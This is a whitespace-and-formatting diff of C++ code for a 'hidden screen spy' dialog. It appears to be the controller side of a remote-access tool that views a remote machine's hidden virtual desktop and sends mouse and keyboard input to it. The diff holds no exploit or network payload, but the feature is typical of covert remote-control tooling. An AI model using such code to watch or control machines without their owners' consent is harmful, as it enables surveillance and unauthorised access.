@@ -55,24 +55,25 @@ CHideScreenSpyDlg::CHideScreenSpyDlg(CWnd* pParent, Server* pIOCPServer, ClientC
     m_bCursorIndex = -1;
 }
 
-CHideScreenSpyDlg::~CHideScreenSpyDlg() {
-	m_bIsClosed = TRUE;
+CHideScreenSpyDlg::~CHideScreenSpyDlg()
+{
+    m_bIsClosed = TRUE;
     m_ContextObject->GetServer()->Disconnect(m_ContextObject);
-	DestroyIcon(m_hIcon);
-	Sleep(200);
-	if (!m_aviFile.IsEmpty()) {
-		KillTimer(132);
-		m_aviFile = "";
-		m_aviStream.Close();
-	}
-	::ReleaseDC(m_hWnd, m_hFullDC);
-	DeleteDC(m_hFullMemDC);
-	DeleteObject(m_BitmapHandle);
-	SAFE_DELETE_ARRAY(m_lpvRectBits);
-	SAFE_DELETE_ARRAY(m_BitmapInfor_Full);
-	SAFE_DELETE_ARRAY(m_lpbmi_rect);
-	SetClassLongPtr(m_hWnd, GCLP_HCURSOR, (LONG_PTR)LoadCursor(NULL, IDC_ARROW));
-	m_bIsCtrl = false;
+    DestroyIcon(m_hIcon);
+    Sleep(200);
+    if (!m_aviFile.IsEmpty()) {
+        KillTimer(132);
+        m_aviFile = "";
+        m_aviStream.Close();
+    }
+    ::ReleaseDC(m_hWnd, m_hFullDC);
+    DeleteDC(m_hFullMemDC);
+    DeleteObject(m_BitmapHandle);
+    SAFE_DELETE_ARRAY(m_lpvRectBits);
+    SAFE_DELETE_ARRAY(m_BitmapInfor_Full);
+    SAFE_DELETE_ARRAY(m_lpbmi_rect);
+    SetClassLongPtr(m_hWnd, GCLP_HCURSOR, (LONG_PTR)LoadCursor(NULL, IDC_ARROW));
+    m_bIsCtrl = false;
 }
 
 void CHideScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
@@ -95,14 +96,14 @@ END_MESSAGE_MAP()
 void CHideScreenSpyDlg::OnClose()
 {
     CancelIO();
-	// 等待数据处理完毕
-	if (IsProcessing()) {
-		ShowWindow(SW_HIDE);
-		return;
-	}
-	// 恢复鼠标状态
-	SetClassLongPtr(m_hWnd, GCLP_HCURSOR, (LONG_PTR)LoadCursor(NULL, IDC_ARROW));
-	CDialogBase::OnClose();
+    // 等待数据处理完毕
+    if (IsProcessing()) {
+        ShowWindow(SW_HIDE);
+        return;
+    }
+    // 恢复鼠标状态
+    SetClassLongPtr(m_hWnd, GCLP_HCURSOR, (LONG_PTR)LoadCursor(NULL, IDC_ARROW));
+    CDialogBase::OnClose();
 }
 
 void CHideScreenSpyDlg::OnReceiveComplete()
@@ -114,10 +115,10 @@ void CHideScreenSpyDlg::OnReceiveComplete()
         DrawFirstScreen(m_ContextObject->GetBuffer(1), m_ContextObject->GetBufferLength()-1);
     }
     break;
-	case TOKEN_NEXTSCREEN: {
-		DrawNextScreenDiff(m_ContextObject->GetBuffer(0), m_ContextObject->GetBufferLength());
-		break;
-	}
+    case TOKEN_NEXTSCREEN: {
+        DrawNextScreenDiff(m_ContextObject->GetBuffer(0), m_ContextObject->GetBufferLength());
+        break;
+    }
     case TOKEN_BITMAPINFO_HIDE:
         ResetScreen();
         break;
@@ -168,9 +169,9 @@ bool CHideScreenSpyDlg::SaveSnapshot()
 BOOL CHideScreenSpyDlg::OnInitDialog()
 {
     CDialog::OnInitDialog();
-	CString strString;
-	strString.Format("%s - 远程虚拟屏幕 %d×%d", m_IPAddress,
-		m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);
+    CString strString;
+    strString.Format("%s - 远程虚拟屏幕 %d×%d", m_IPAddress,
+                     m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);
     SetWindowText(strString);
 
     // Set the icon for this dialog.  The framework does this automatically
@@ -228,8 +229,8 @@ BOOL CHideScreenSpyDlg::OnInitDialog()
     m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);
     ICONINFO CursorInfo;
     ::GetIconInfo(m_hRemoteCursor, &CursorInfo);
-	pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);
-	SetClassLongPtr(m_hWnd, GCLP_HCURSOR, (LONG_PTR)m_hRemoteCursor);
+    pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);
+    SetClassLongPtr(m_hWnd, GCLP_HCURSOR, (LONG_PTR)m_hRemoteCursor);
     if (CursorInfo.hbmMask != NULL)
         ::DeleteObject(CursorInfo.hbmMask);
     if (CursorInfo.hbmColor != NULL)
@@ -292,7 +293,7 @@ void CHideScreenSpyDlg::DrawFirstScreen(PBYTE pDeCompressionData, unsigned long	
         if(dwFirstLength > 0)
             JPG_BMP(m_BitmapInfor_Full->bmiHeader.biBitCount, lpFirstScreen, dwFirstLength, m_BitmapData_Full);
     } else {
-		m_ContextObject->CopyBuffer(m_BitmapData_Full, m_BitmapInfor_Full->bmiHeader.biSizeImage, 1);
+        m_ContextObject->CopyBuffer(m_BitmapData_Full, m_BitmapInfor_Full->bmiHeader.biSizeImage, 1);
     }
 #if _DEBUG
     DoPaint();
@@ -312,109 +313,106 @@ void CHideScreenSpyDlg::DrawNextScreenHome(PBYTE pDeCompressionData, unsigned lo
     DWORD	dwNextLength = destLen - nHeadLength;
     DWORD	dwNextOffset = 0;
 
-	// 屏幕数据是否变化
-	while (dwNextOffset < dwNextLength) {
-		int* pinlen = (int*)((LPBYTE)lpNextScreen + dwNextOffset);
+    // 屏幕数据是否变化
+    while (dwNextOffset < dwNextLength) {
+        int* pinlen = (int*)((LPBYTE)lpNextScreen + dwNextOffset);
 
-		if (JPG_BMP(m_BitmapInfor_Full->bmiHeader.biBitCount, pinlen + 1, *pinlen, m_lpvRectBits)) {
-			bIsReDraw = true;
-			LPRECT lpChangedRect = (LPRECT)((LPBYTE)(pinlen + 1) + *pinlen);
-			int nChangedRectWidth = lpChangedRect->right - lpChangedRect->left;
-			int nChangedRectHeight = lpChangedRect->bottom - lpChangedRect->top;
+        if (JPG_BMP(m_BitmapInfor_Full->bmiHeader.biBitCount, pinlen + 1, *pinlen, m_lpvRectBits)) {
+            bIsReDraw = true;
+            LPRECT lpChangedRect = (LPRECT)((LPBYTE)(pinlen + 1) + *pinlen);
+            int nChangedRectWidth = lpChangedRect->right - lpChangedRect->left;
+            int nChangedRectHeight = lpChangedRect->bottom - lpChangedRect->top;
 
-			m_lpbmi_rect->bmiHeader.biWidth = nChangedRectWidth;
-			m_lpbmi_rect->bmiHeader.biHeight = nChangedRectHeight;
-			m_lpbmi_rect->bmiHeader.biSizeImage = (((nChangedRectWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3)
-				* nChangedRectHeight;
+            m_lpbmi_rect->bmiHeader.biWidth = nChangedRectWidth;
+            m_lpbmi_rect->bmiHeader.biHeight = nChangedRectHeight;
+            m_lpbmi_rect->bmiHeader.biSizeImage = (((nChangedRectWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3)
+                                                  * nChangedRectHeight;
 
-			StretchDIBits(m_hFullMemDC, lpChangedRect->left, lpChangedRect->top, nChangedRectWidth, nChangedRectHeight,
-				0, 0, nChangedRectWidth, nChangedRectHeight, m_lpvRectBits, m_lpbmi_rect, DIB_RGB_COLORS, SRCCOPY);
+            StretchDIBits(m_hFullMemDC, lpChangedRect->left, lpChangedRect->top, nChangedRectWidth, nChangedRectHeight,
+                          0, 0, nChangedRectWidth, nChangedRectHeight, m_lpvRectBits, m_lpbmi_rect, DIB_RGB_COLORS, SRCCOPY);
 
-			dwNextOffset += sizeof(int) + *pinlen + sizeof(RECT);
-		}
-	}
+            dwNextOffset += sizeof(int) + *pinlen + sizeof(RECT);
+        }
+    }
 
     if (bIsReDraw) {
         DoPaint();
     }
 }
 
-BOOL CHideScreenSpyDlg::ParseFrame(void) {
-	//该函数不是直接画到屏幕上，而是更新一下变化部分的屏幕数据然后调用
-	//OnPaint画上去
-	//根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标，防止鼠标闪烁
-	BOOL	bChange = FALSE;
-	const ULONG	ulHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 标识 + 算法 + 光标位置 + 光标类型索引
-	ULONG	NextScreenLength = m_ContextObject->GetBufferLength() - ulHeadLength;
+BOOL CHideScreenSpyDlg::ParseFrame(void)
+{
+    //该函数不是直接画到屏幕上，而是更新一下变化部分的屏幕数据然后调用
+    //OnPaint画上去
+    //根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标，防止鼠标闪烁
+    BOOL	bChange = FALSE;
+    const ULONG	ulHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 标识 + 算法 + 光标位置 + 光标类型索引
+    ULONG	NextScreenLength = m_ContextObject->GetBufferLength() - ulHeadLength;
 
-	POINT	OldClientCursorPos;
-	memcpy(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT));
-	memcpy(&m_ClientCursorPos, m_ContextObject->GetBuffer(2), sizeof(POINT));
+    POINT	OldClientCursorPos;
+    memcpy(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT));
+    memcpy(&m_ClientCursorPos, m_ContextObject->GetBuffer(2), sizeof(POINT));
 
-	// 鼠标移动了
-	if (memcmp(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT)) != 0) {
-		bChange = TRUE;
-	}
+    // 鼠标移动了
+    if (memcmp(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT)) != 0) {
+        bChange = TRUE;
+    }
 
-	// 光标类型发生变化
-	BYTE bOldCursorIndex = m_bCursorIndex;
-	m_bCursorIndex = m_ContextObject->GetBYTE(2 + sizeof(POINT));
-	if (bOldCursorIndex != m_bCursorIndex) {
-		bChange = TRUE;
-		if (m_bIsCtrl)//替换指定窗口所属类的WNDCLASSEX结构
+    // 光标类型发生变化
+    BYTE bOldCursorIndex = m_bCursorIndex;
+    m_bCursorIndex = m_ContextObject->GetBYTE(2 + sizeof(POINT));
+    if (bOldCursorIndex != m_bCursorIndex) {
+        bChange = TRUE;
+        if (m_bIsCtrl)//替换指定窗口所属类的WNDCLASSEX结构
 #ifdef _WIN64
-			SetClassLongPtrA(m_hWnd, GCLP_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
+            SetClassLongPtrA(m_hWnd, GCLP_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
 #else
-			SetClassLongA(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
+            SetClassLongA(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
 #endif
-	}
+    }
 
-	// 屏幕是否变化
-	if (NextScreenLength > 0) {
-		bChange = TRUE;
-	}
-	return bChange;
+    // 屏幕是否变化
+    if (NextScreenLength > 0) {
+        bChange = TRUE;
+    }
+    return bChange;
 }
 
 void CHideScreenSpyDlg::DrawNextScreenDiff(PBYTE pDeCompressionData, unsigned long	destLen)
 {
-	if (!destLen) return;
-	// 根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标, 防止鼠标闪烁
-	BYTE	algorithm = pDeCompressionData[1];
+    if (!destLen) return;
+    // 根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标, 防止鼠标闪烁
+    BYTE	algorithm = pDeCompressionData[1];
     if (algorithm == ALGORITHM_HOME) {
         return DrawNextScreenHome(pDeCompressionData + 1, destLen - 1);
     }
-	bool	bIsReDraw = ParseFrame();
-	bool    keyFrame = false;
-	const ULONG	ulHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE);
-	LPVOID	FirstScreenData = m_BitmapData_Full;
-	LPVOID	NextScreenData = m_ContextObject->GetBuffer(ulHeadLength);
-	ULONG	NextScreenLength = NextScreenData ? m_ContextObject->GetBufferLength() - ulHeadLength : 0;
+    bool	bIsReDraw = ParseFrame();
+    bool    keyFrame = false;
+    const ULONG	ulHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE);
+    LPVOID	FirstScreenData = m_BitmapData_Full;
+    LPVOID	NextScreenData = m_ContextObject->GetBuffer(ulHeadLength);
+    ULONG	NextScreenLength = NextScreenData ? m_ContextObject->GetBufferLength() - ulHeadLength : 0;
 
-	LPBYTE dst = (LPBYTE)FirstScreenData, p = (LPBYTE)NextScreenData;
-	if (keyFrame)
-	{
-		if (m_BitmapInfor_Full->bmiHeader.biSizeImage == NextScreenLength)
-			memcpy(dst, p, m_BitmapInfor_Full->bmiHeader.biSizeImage);
-	}
-	else if (0 != NextScreenLength) {
+    LPBYTE dst = (LPBYTE)FirstScreenData, p = (LPBYTE)NextScreenData;
+    if (keyFrame) {
+        if (m_BitmapInfor_Full->bmiHeader.biSizeImage == NextScreenLength)
+            memcpy(dst, p, m_BitmapInfor_Full->bmiHeader.biSizeImage);
+    } else if (0 != NextScreenLength) {
         bIsReDraw = true;
-		for (LPBYTE end = p + NextScreenLength; p < end; ) {
-			ULONG ulCount = *(LPDWORD(p + sizeof(ULONG)));
-			if (algorithm == ALGORITHM_GRAY) {
-				LPBYTE p1 = dst + *(LPDWORD)p, p2 = p + 2 * sizeof(ULONG);
-				for (int i = 0; i < ulCount; ++i, p1 += 4)
-					memset(p1, *p2++, sizeof(DWORD));
-			}
-			else {
-				memcpy(dst + *(LPDWORD)p, p + 2 * sizeof(ULONG), ulCount);
-			}
-			p += 2 * sizeof(ULONG) + ulCount;
-		}
-	}
+        for (LPBYTE end = p + NextScreenLength; p < end; ) {
+            ULONG ulCount = *(LPDWORD(p + sizeof(ULONG)));
+            if (algorithm == ALGORITHM_GRAY) {
+                LPBYTE p1 = dst + *(LPDWORD)p, p2 = p + 2 * sizeof(ULONG);
+                for (int i = 0; i < ulCount; ++i, p1 += 4)
+                    memset(p1, *p2++, sizeof(DWORD));
+            } else {
+                memcpy(dst + *(LPDWORD)p, p + 2 * sizeof(ULONG), ulCount);
+            }
+            p += 2 * sizeof(ULONG) + ulCount;
+        }
+    }
 
-    if (bIsReDraw)
-    {
+    if (bIsReDraw) {
         DoPaint();
     }
 }
@@ -724,12 +722,17 @@ BOOL CHideScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
     switch (pMsg->message) {
     case WM_ERASEBKGND:
         return TRUE;
-    case WM_LBUTTONDOWN: case WM_LBUTTONUP: // 左键按下
-    case WM_RBUTTONDOWN: case WM_RBUTTONUP: // 右键按下
-    case WM_MBUTTONDOWN: case WM_MBUTTONUP: // 中键按下
-    case WM_LBUTTONDBLCLK: case WM_RBUTTONDBLCLK: case WM_MBUTTONDBLCLK: // 双击
-    case WM_MOUSEMOVE: case WM_MOUSEWHEEL:  // 鼠标移动
-    {
+    case WM_LBUTTONDOWN:
+    case WM_LBUTTONUP: // 左键按下
+    case WM_RBUTTONDOWN:
+    case WM_RBUTTONUP: // 右键按下
+    case WM_MBUTTONDOWN:
+    case WM_MBUTTONUP: // 中键按下
+    case WM_LBUTTONDBLCLK:
+    case WM_RBUTTONDBLCLK:
+    case WM_MBUTTONDBLCLK: // 双击
+    case WM_MOUSEMOVE:
+    case WM_MOUSEWHEEL: { // 鼠标移动
         // 此逻辑会丢弃所有 非左键拖拽 的鼠标移动消息（如纯移动或右键拖拽）
         if (pMsg->message == WM_MOUSEMOVE && GetKeyState(VK_LBUTTON) >= 0)
             break;
@@ -738,13 +741,14 @@ BOOL CHideScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
     }
     case WM_CHAR: {
         // 检查给定字符是否为控制字符
-		if (iswcntrl(static_cast<wint_t>(pMsg->wParam))) {
-			break;
-		}
+        if (iswcntrl(static_cast<wint_t>(pMsg->wParam))) {
+            break;
+        }
         SendScaledMouseMessage(pMsg);
         return TRUE;
     }
-    case WM_KEYDOWN: case WM_KEYUP: {
+    case WM_KEYDOWN:
+    case WM_KEYUP: {
         SendScaledMouseMessage(pMsg);
         return TRUE;
     }
@@ -756,30 +760,31 @@ BOOL CHideScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
     return CDialog::PreTranslateMessage(pMsg);
 }
 
-void CHideScreenSpyDlg::SendScaledMouseMessage(MSG* pMsg, bool makeLP) {
-	if (!m_bIsCtrl)
-		return;
+void CHideScreenSpyDlg::SendScaledMouseMessage(MSG* pMsg, bool makeLP)
+{
+    if (!m_bIsCtrl)
+        return;
 
-	if (pMsg->message == WM_MOUSEMOVE) {
-		auto now = clock();
-		auto time_elapsed = now - m_lastMouseMove;
-		int dx = abs(pMsg->pt.x - m_lastMousePoint.x);
-		int dy = abs(pMsg->pt.y - m_lastMousePoint.y);
-		int dist_sq = dx * dx + dy * dy;
-		if (time_elapsed < 200 && dist_sq < 18 * 18) {
-			return;
-		}
-		m_lastMouseMove = now;
-		m_lastMousePoint = pMsg->pt;
-	}
+    if (pMsg->message == WM_MOUSEMOVE) {
+        auto now = clock();
+        auto time_elapsed = now - m_lastMouseMove;
+        int dx = abs(pMsg->pt.x - m_lastMousePoint.x);
+        int dy = abs(pMsg->pt.y - m_lastMousePoint.y);
+        int dist_sq = dx * dx + dy * dy;
+        if (time_elapsed < 200 && dist_sq < 18 * 18) {
+            return;
+        }
+        m_lastMouseMove = now;
+        m_lastMousePoint = pMsg->pt;
+    }
 
     MYMSG msg(*pMsg);
     LONG low = ((LONG)LOWORD(pMsg->lParam)) * m_wZoom;
     LONG high = ((LONG)HIWORD(pMsg->lParam)) * m_hZoom;
     if(makeLP) msg.lParam = MAKELPARAM(low, high);
-	msg.pt.x = low + m_rect.left;
-	msg.pt.y = high + m_rect.top;
-	SendCommand(msg);
+    msg.pt.x = low + m_rect.left;
+    msg.pt.y = high + m_rect.top;
+    SendCommand(msg);
 }
 
 void CHideScreenSpyDlg::SendCommand(const MYMSG& pMsg)
